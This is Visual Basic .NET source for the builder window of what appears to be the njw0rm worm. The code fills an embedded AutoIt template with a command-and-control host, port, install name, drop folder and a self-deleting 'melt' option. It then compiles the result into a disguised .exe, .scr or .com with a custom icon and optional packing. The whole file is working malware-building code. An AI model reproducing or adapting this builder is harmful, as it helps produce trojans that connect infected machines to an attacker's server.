Public Class Form2
    Private Sub ico_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ico.Click
        If ico.Tag Is Nothing Then
            Dim f As New OpenFileDialog
            f.FileName = ""
            f.Filter = "Icon|*.ico"
            If f.ShowDialog = Windows.Forms.DialogResult.OK Then
                ico.Text = ""
                ico.Image = Icon.ExtractAssociatedIcon(f.FileName).ToBitmap
                ico.Tag = f.FileName
            End If
        Else
            ico.Tag = Nothing
            ico.Text = "Icon"
            ico.Image = Nothing
        End If
    End Sub
    Sub compile(ByVal icon As String, ByVal comp As Integer, ByVal Name As String, ByVal host As String, ByVal port As Integer, ByVal exe As String, ByVal dir As String, ByVal out As String)
        Dim s As String = My.Resources.src_txt
        s = s.Replace("<name>", Name)
        s = s.Replace("<host>", host)
        s = s.Replace("<port>", port)
        s = s.Replace("<exe>", exe)
        s = s.Replace("<dir>", dir)
        s = s.Replace("""<melt>""", CInt(CheckBox1.Checked))
        s = s.Replace("<mtx>", dir & exe)
        IO.File.WriteAllText(Application.StartupPath & "\njw0rm.au3", s)
        Dim p As New ProcessStartInfo
        p.FileName = autpath
        p.Arguments = "/in " & ChrW(34) & Application.StartupPath & "\njw0rm.au3" & ChrW(34) & " /out " & ChrW(34) & out & ChrW(34) & " /icon " & ChrW(34) & icon & ChrW(34) & " /x86"
        If comp = -1 Then
            p.Arguments &= " /nopack"
        Else
            p.Arguments &= " /comp " & comp
        End If
        Process.Start(p).WaitForExit()
        MsgBox(out, , "Done!")
        Me.Close()
    End Sub
    Public autpath As String = Environ("programfiles") & "\AutoIt3\Aut2Exe\Aut2exe.exe"
    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Icon = F.Icon
        If IO.File.Exists(autpath) = False Then
            MsgBox("To Use Builder Please Install AutoIt3", , "Builder")
            Me.Close()
        End If
        comp.SelectedIndex = 0
        dir.SelectedIndex = 0
        Try
            port.Value = GTV("bport", port.Value)
        Catch ex As Exception
        End Try
        Try
            CheckBox1.Checked = CInt(GTV("melt", CInt(CheckBox1.Checked).ToString))
        Catch ex As Exception
        End Try
        Try
            nam.Text = GTV("nam", nam.Text)
        Catch ex As Exception
        End Try
        Try
            host.Text = GTV("host", host.Text)
        Catch ex As Exception
        End Try
        Try
            exe.Text = GTV("exe", exe.Text)
        Catch ex As Exception
        End Try
        Try
            dir.SelectedIndex = GTV("dir", 0)
        Catch ex As Exception
        End Try
        Try
            comp.SelectedIndex = GTV("comp", 0)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim f As New SaveFileDialog
        f.FileName = "w0rm.exe"
        f.Filter = "|*.exe||*.scr||*.com"
        If f.ShowDialog = Windows.Forms.DialogResult.OK Then
            compile(ico.Tag, comp.SelectedIndex - 1, nam.Text, host.Text, port.Value, exe.Text, dir.Text, f.FileName)
            Try
                STV("bport", port.Value)
            Catch ex As Exception
            End Try
            Try
                STV("nam", nam.Text)
            Catch ex As Exception
            End Try
            Try
                STV("host", host.Text)
            Catch ex As Exception
            End Try
            Try
                STV("exe", exe.Text)
            Catch ex As Exception
            End Try
            Try
                STV("dir", dir.SelectedIndex)
            Catch ex As Exception
            End Try
            Try
                STV("comp", comp.SelectedIndex)
            Catch ex As Exception
            End Try
            Try
                STV("melt", CInt(CheckBox1.Checked).ToString)
            Catch ex As Exception

            End Try
        End If
    End Sub
    Private Sub exe_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles exe.MouseLeave
        If exe.Text <> "" Then
            If exe.Text.Contains(".") Then
                Select Case Split(exe.Text, ".")(Split(exe.Text, ".").Length - 1).ToLower
                    Case "exe", "scr", "com"
                    Case Else
                        exe.Text &= ".exe"
                End Select
            Else
                exe.Text &= ".exe"
            End If
        Else
            exe.Text = "njw0rm.exe"
        End If
    End Sub
End Class